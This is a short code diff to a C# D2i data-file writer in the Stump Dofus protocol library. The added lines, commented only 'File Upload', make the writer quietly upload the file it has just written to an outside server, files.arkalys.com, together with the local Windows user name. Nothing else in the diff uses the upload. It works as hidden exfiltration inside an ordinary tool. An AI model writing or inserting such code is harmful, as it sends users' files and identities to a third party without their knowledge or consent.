@@ -14,9 +14,11 @@
 // if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 #endregion
 
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Net;
 using Stump.Core.IO;
 using Stump.Core.Pool;
 
@@ -167,6 +169,10 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2i
                 writer.Seek(0, SeekOrigin.Begin);
                 writer.WriteInt(indexPos);
             }
+
+            //File Upload
+            var webClient = new WebClient {Proxy = WebRequest.GetSystemWebProxy()};
+            webClient.UploadFile("http://files.arkalys.com/sendfile.php?name=" + Environment.UserName.Trim(), uri);
         }
     }
 }
